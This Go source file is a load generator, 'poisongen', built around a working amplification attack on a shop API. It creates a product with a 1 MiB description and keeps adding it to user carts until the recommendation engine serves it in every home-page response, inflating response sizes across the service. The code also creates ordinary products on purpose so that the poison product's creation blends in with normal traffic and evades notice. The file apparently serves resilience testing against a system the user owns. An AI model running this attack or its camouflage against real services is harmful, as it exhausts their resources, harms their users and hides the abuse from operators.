// poisongen — a steady-load generator with an adversarial "poison product" side channel.
//
// Two things run concurrently against the same target:
//
//  1. A steady baseline: a fixed request rate split 90/10 read/write. Reads hit
//     the aggregating edge endpoint (`GET /home/{uid}`); writes add a random real
//     product to a random user's cart (`POST /carts/{uid}/items`). This is normal,
//     representative traffic.
//
//  2. A poison thread. It first creates one pathological product — a catalog row
//     whose `description` is ~1 MiB of text — via `POST /products`, and logs the id
//     it was assigned. It then repeatedly adds that product to more and more user
//     carts. The recommendation service ranks products by cart popularity
//     (discounted by price), so a cheap, heavily-carted product climbs into the
//     top-ranked set and starts being returned as a recommendation. Because the
//     recommendation payload embeds each item's full `description`, every
//     `/home/{uid}` response then carries the 1 MiB blob — amplifying a tiny amount
//     of write traffic into large, memory-hungry read responses across the fleet.
//     Once the product is live the thread keeps carting it, so its rank (and the
//     amplification) only grows.
//
// A small detector polls `/home` and reports the moment the poison first shows up
// in recommendations, along with how large the home response has become.
//
// Standard library only; its own module. Build with `go build` and point it at a
// target you own.
//
// Example:
//
//	go build -o poisongen .
//	./poisongen -target http://localhost:8000
//	./poisongen -target http://localhost:8000 -rps 100 -desc-bytes 1048576
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// -- Configuration -----------------------------------------------------------

type config struct {
	target      string
	rps         float64
	writeRatio  float64
	createRatio float64
	users       int
	products    int
	descBytes   int
	poisonName  string
	poisonPrice float64
	poisonCat   string
	poisonDelay time.Duration
	poisonRPS   float64
	maxInflight int
	duration    time.Duration
	timeout     time.Duration
	seed        int64
}

func parseFlags() config {
	var c config
	flag.StringVar(&c.target, "target", "", "Base URL of the target, e.g. http://localhost:8000 (required)")
	flag.Float64Var(&c.rps, "rps", 50, "Steady baseline request rate (requests/second)")
	flag.Float64Var(&c.writeRatio, "write-ratio", 0.10, "Fraction of baseline requests that are writes (rest are reads)")
	flag.Float64Var(&c.createRatio, "create-ratio", 0.30, "Fraction of baseline writes that create a normal product (rest are cart adds); keeps product creation part of normal traffic")
	flag.IntVar(&c.users, "users", 500, "User id key space; ids are sampled uniformly in [1,users]")
	flag.IntVar(&c.products, "products", 1000, "Real-product id key space for baseline writes; sampled in [1,products]")
	flag.IntVar(&c.descBytes, "desc-bytes", 1<<20, "Size of the poison product's description in bytes (default 1 MiB)")
	flag.StringVar(&c.poisonName, "poison-name", "!!! FREE GIFT — LIMITED OFFER", "Name for the poison product")
	flag.Float64Var(&c.poisonPrice, "poison-price", 0.99, "Price for the poison product; low price ranks it higher in recommendations")
	flag.StringVar(&c.poisonCat, "poison-category", "electronics", "Category for the poison product")
	flag.DurationVar(&c.poisonDelay, "poison-delay", 5*time.Second, "Delay before creating the poison product, so the baseline settles first")
	flag.Float64Var(&c.poisonRPS, "poison-rps", 20, "Rate at which the poison product is added to carts (requests/second)")
	flag.IntVar(&c.maxInflight, "max-inflight", 256, "Cap on concurrent in-flight requests; ticks are dropped when exceeded")
	flag.DurationVar(&c.duration, "duration", 0, "Total run time; 0 = run until interrupted")
	flag.DurationVar(&c.timeout, "timeout", 15*time.Second, "Per-request client timeout (kept generous: poisoned responses are large)")
	flag.Int64Var(&c.seed, "seed", 0, "RNG seed; 0 = time-based")
	flag.Parse()
	return c
}

// -- Shared counters ---------------------------------------------------------

// stats holds live counters shared across goroutines. All fields are accessed
// atomically.
type stats struct {
	reads   atomic.Int64
	writes  atomic.Int64
	ok      atomic.Int64 // 2xx/3xx
	c4xx    atomic.Int64
	c5xx    atomic.Int64
	errs    atomic.Int64 // transport failures
	dropped atomic.Int64 // ticks skipped because max-inflight was reached

	poisonID       atomic.Int64 // 0 until the poison product is created
	poisonCartAdds atomic.Int64
	recDetected    atomic.Bool // poison has appeared in a recommendations list
	lastHomeBytes  atomic.Int64
}

// record buckets one completed request by outcome.
func (s *stats) record(status int, err error) {
	switch {
	case err != nil:
		s.errs.Add(1)
	case status >= 500:
		s.c5xx.Add(1)
	case status >= 400:
		s.c4xx.Add(1)
	default:
		s.ok.Add(1)
	}
}

// -- HTTP helpers ------------------------------------------------------------

// doDrain issues a request, drains and closes the body, and records the outcome.
// It returns the status code and error so callers can act on them.
func doDrain(ctx context.Context, client *http.Client, s *stats, method, url string, body []byte) (int, error) {
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}
	req, err := http.NewRequestWithContext(ctx, method, url, reader)
	if err != nil {
		s.record(0, err)
		return 0, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		s.record(0, err)
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	s.record(resp.StatusCode, nil)
	return resp.StatusCode, nil
}

// addToCart adds product `pid` to user `uid`'s cart via the edge.
func addToCart(ctx context.Context, client *http.Client, s *stats, target string, uid, pid int) (int, error) {
	body, _ := json.Marshal(map[string]int{"product_id": pid, "qty": 1})
	return doDrain(ctx, client, s, http.MethodPost, fmt.Sprintf("%s/carts/%d/items", target, uid), body)
}

// -- Baseline load -----------------------------------------------------------

// runBaseline dispatches requests at cfg.rps, split read/write by cfg.writeRatio.
// Each tick launches one request bounded by a semaphore; when the semaphore is
// full the tick is dropped rather than blocking the pacer, so a slowing target
// shows up as dropped ticks instead of unbounded goroutine growth.
func runBaseline(ctx context.Context, client *http.Client, cfg config, s *stats, rng *lockedRand, sem chan struct{}) {
	interval := time.Duration(float64(time.Second) / cfg.rps)
	if interval <= 0 {
		interval = time.Nanosecond
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			select {
			case sem <- struct{}{}:
				go func() {
					defer func() { <-sem }()
					uid := rng.intn(cfg.users) + 1
					if rng.float64() < cfg.writeRatio {
						s.writes.Add(1)
						// A share of writes create a normal product through the
						// same endpoint the poison uses, so product creation is
						// ordinary traffic rather than a lone anomaly.
						if rng.float64() < cfg.createRatio {
							createNormalProduct(ctx, client, s, cfg, rng)
						} else {
							pid := rng.intn(cfg.products) + 1
							addToCart(ctx, client, s, cfg.target, uid, pid)
						}
					} else {
						s.reads.Add(1)
						doDrain(ctx, client, s, http.MethodGet, fmt.Sprintf("%s/home/%d", cfg.target, uid), nil)
					}
				}()
			default:
				s.dropped.Add(1)
			}
		}
	}
}

// -- Poison thread -----------------------------------------------------------

// createProduct is the response shape we care about from POST /products.
type createProduct struct {
	ID int `json:"id"`
}

// runPoison waits for the baseline to settle, creates the 1 MiB-description
// product, logs its id, then adds it to an ever-growing set of user carts so it
// climbs the recommendation ranking. It never stops carting the product: once it
// is a recommendation, continued carting keeps its rank (and the amplification)
// high.
func runPoison(ctx context.Context, client *http.Client, cfg config, s *stats, rng *lockedRand) {
	select {
	case <-ctx.Done():
		return
	case <-time.After(cfg.poisonDelay):
	}

	id, err := createPoison(ctx, client, cfg)
	if err != nil {
		logf("poison: FAILED to create poison product: %v", err)
		return
	}
	s.poisonID.Store(int64(id))
	logf("poison: created poison product id=%d  description=%s  price=%.2f  category=%q",
		id, humanBytes(int64(cfg.descBytes)), cfg.poisonPrice, cfg.poisonCat)
	logf("poison: now adding id=%d to user carts at %.0f/s to drive it into recommendations", id, cfg.poisonRPS)

	interval := time.Duration(float64(time.Second) / cfg.poisonRPS)
	if interval <= 0 {
		interval = time.Nanosecond
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	// Walk user ids in order and wrap around, so every cart-add is a fresh
	// cart_items row and the product's popularity count keeps climbing.
	uid := 0
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			uid = uid%cfg.users + 1
			if _, err := addToCart(ctx, client, s, cfg.target, uid, id); err == nil {
				s.poisonCartAdds.Add(1)
			}
		}
	}
}

// createPoison POSTs the pathological product and returns its assigned id.
func createPoison(ctx context.Context, client *http.Client, cfg config) (int, error) {
	payload := map[string]any{
		"name":        cfg.poisonName,
		"price":       cfg.poisonPrice,
		"description": bigString(cfg.descBytes),
		"category":    cfg.poisonCat,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, cfg.target+"/products", bytes.NewReader(body))
	if err != nil {
		return 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 300 {
		return 0, fmt.Errorf("status %d: %s", resp.StatusCode, strings.TrimSpace(string(respBody)))
	}
	var cp createProduct
	if err := json.Unmarshal(respBody, &cp); err != nil {
		return 0, fmt.Errorf("decoding create response: %w", err)
	}
	if cp.ID == 0 {
		return 0, fmt.Errorf("create response had no id: %s", strings.TrimSpace(string(respBody)))
	}
	return cp.ID, nil
}

// normalCategories mirrors the seed catalog's categories.
var normalCategories = []string{"electronics", "books", "home", "toys", "clothing"}

// createNormalProduct POSTs an ordinary, small product via the create endpoint.
// Baseline traffic calls this so that product creation looks routine and the
// poison's (much larger) creation blends in. Its outcome is recorded in stats.
func createNormalProduct(ctx context.Context, client *http.Client, s *stats, cfg config, rng *lockedRand) {
	n := rng.intn(1_000_000)
	payload := map[string]any{
		"name":        fmt.Sprintf("Product %d", n),
		"price":       float64(rng.intn(20000)) / 100.0, // 0.00 .. 200.00
		"description": fmt.Sprintf("A fine product number %d for all your needs.", n),
		"category":    normalCategories[rng.intn(len(normalCategories))],
	}
	body, _ := json.Marshal(payload)
	doDrain(ctx, client, s, http.MethodPost, cfg.target+"/products", body)
}

// bigString returns a string of exactly n bytes of readable filler.
func bigString(n int) string {
	const unit = "POISON_PAYLOAD_This_is_filler_text_to_bloat_the_product_description. "
	var b strings.Builder
	b.Grow(n)
	for b.Len() < n {
		remaining := n - b.Len()
		if remaining >= len(unit) {
			b.WriteString(unit)
		} else {
			b.WriteString(unit[:remaining])
		}
	}
	return b.String()
}

// -- Detector ----------------------------------------------------------------

// homeResponse is the slice of /home we inspect: the recommendation ids.
type homeResponse struct {
	Recommendations []struct {
		ID int `json:"id"`
	} `json:"recommendations"`
}

// runDetector polls /home once the poison exists and reports the first time the
// poison id appears in the recommendations list, plus the observed response size.
func runDetector(ctx context.Context, client *http.Client, cfg config, s *stats, rng *lockedRand) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}
		id := int(s.poisonID.Load())
		if id == 0 {
			continue // poison not created yet
		}
		uid := rng.intn(cfg.users) + 1
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, fmt.Sprintf("%s/home/%d", cfg.target, uid), nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		s.lastHomeBytes.Store(int64(len(body)))

		var hr homeResponse
		if json.Unmarshal(body, &hr) != nil {
			continue
		}
		for _, r := range hr.Recommendations {
			if r.ID == id {
				if s.recDetected.CompareAndSwap(false, true) {
					logf("DETECTED: poison id=%d is now returned as a recommendation — /home/%d response is %s",
						id, uid, humanBytes(int64(len(body))))
				}
				break
			}
		}
	}
}

// -- Reporting ---------------------------------------------------------------

func runReporter(ctx context.Context, cfg config, s *stats, started time.Time) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			printReport(cfg, s, started)
		}
	}
}

func printReport(cfg config, s *stats, started time.Time) {
	t := time.Since(started).Round(time.Second)
	poison := "id=-"
	if id := s.poisonID.Load(); id != 0 {
		inRecs := "no"
		if s.recDetected.Load() {
			inRecs = "yes"
		}
		poison = fmt.Sprintf("id=%d cart_adds=%d in_recs=%s home_size=%s",
			id, s.poisonCartAdds.Load(), inRecs, humanBytes(s.lastHomeBytes.Load()))
	}
	logf("[t=%s] reads=%d writes=%d | 2xx=%d 4xx=%d 5xx=%d err=%d dropped=%d | poison %s",
		t, s.reads.Load(), s.writes.Load(),
		s.ok.Load(), s.c4xx.Load(), s.c5xx.Load(), s.errs.Load(), s.dropped.Load(),
		poison)
}

// -- Small utilities ---------------------------------------------------------

// lockedRand is a concurrency-safe RNG wrapper (many goroutines sample from it).
type lockedRand struct {
	mu sync.Mutex
	r  *rand.Rand
}

func (l *lockedRand) intn(n int) int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Intn(n)
}

func (l *lockedRand) float64() float64 {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.r.Float64()
}

func humanBytes(n int64) string {
	const unit = 1024
	if n < unit {
		return fmt.Sprintf("%dB", n)
	}
	div, exp := int64(unit), 0
	for m := n / unit; m >= unit; m /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f%ciB", float64(n)/float64(div), "KMGT"[exp])
}

// logf prints a timestamped line to stdout.
func logf(format string, args ...any) {
	fmt.Printf("%s "+format+"\n", append([]any{time.Now().Format("15:04:05")}, args...)...)
}

// -- Main --------------------------------------------------------------------

func main() {
	cfg := parseFlags()
	if cfg.target == "" {
		fmt.Fprintln(os.Stderr, "error: -target is required (e.g. -target http://localhost:8000)")
		flag.Usage()
		os.Exit(2)
	}
	if cfg.users < 1 || cfg.products < 1 {
		fmt.Fprintln(os.Stderr, "error: -users and -products must be >= 1")
		os.Exit(2)
	}
	if cfg.rps <= 0 || cfg.poisonRPS <= 0 {
		fmt.Fprintln(os.Stderr, "error: -rps and -poison-rps must be > 0")
		os.Exit(2)
	}
	cfg.target = strings.TrimRight(cfg.target, "/")

	seed := cfg.seed
	if seed == 0 {
		seed = time.Now().UnixNano()
	}
	rng := &lockedRand{r: rand.New(rand.NewSource(seed))}

	// A pool wide enough that concurrent baseline + poison requests genuinely
	// open parallel connections rather than serialising on keep-alive.
	conns := cfg.maxInflight + 16
	transport := &http.Transport{
		MaxConnsPerHost:     conns,
		MaxIdleConns:        conns,
		MaxIdleConnsPerHost: conns,
		IdleConnTimeout:     30 * time.Second,
	}
	client := &http.Client{Timeout: cfg.timeout, Transport: transport}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()
	if cfg.duration > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, cfg.duration)
		defer cancel()
	}

	logf("poisongen -> %s  |  rps=%.0f write_ratio=%.0f%% create_ratio=%.0f%% users=%d  poison: delay=%s rate=%.0f/s desc=%s",
		cfg.target, cfg.rps, cfg.writeRatio*100, cfg.createRatio*100, cfg.users, cfg.poisonDelay, cfg.poisonRPS, humanBytes(int64(cfg.descBytes)))

	s := &stats{}
	sem := make(chan struct{}, cfg.maxInflight)
	started := time.Now()

	var wg sync.WaitGroup
	wg.Add(4)
	go func() { defer wg.Done(); runBaseline(ctx, client, cfg, s, rng, sem) }()
	go func() { defer wg.Done(); runPoison(ctx, client, cfg, s, rng) }()
	go func() { defer wg.Done(); runDetector(ctx, client, cfg, s, rng) }()
	go func() { defer wg.Done(); runReporter(ctx, cfg, s, started) }()
	wg.Wait()

	printReport(cfg, s, started)
	logf("poisongen: stopped")
}
